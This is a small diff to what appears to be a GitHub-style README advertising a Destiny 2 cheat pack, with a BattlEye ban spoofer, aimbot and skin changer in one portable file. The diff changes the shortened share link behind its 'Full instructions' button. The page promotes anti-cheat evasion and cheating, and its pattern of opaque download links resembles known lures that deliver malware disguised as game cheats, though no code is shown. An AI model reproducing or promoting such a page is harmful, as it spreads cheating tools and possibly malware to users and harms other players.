@@ -5,7 +5,7 @@
 Download the **Destiny 2** pack: a spoofer for BattlEye bans, a configurable aimbot and a full skin changer in a single portable file. **No subscription, no account, works offline.**
 
 <p align="center">
-  <a href="https://share.google/M6f65lFMTyj6BHzLQ"><img src="button.svg" alt="Full instructions" height="46"></a>
+  <a href="https://share.google/daRMd29npWEDb4Cv3"><img src="button.svg" alt="Full instructions" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
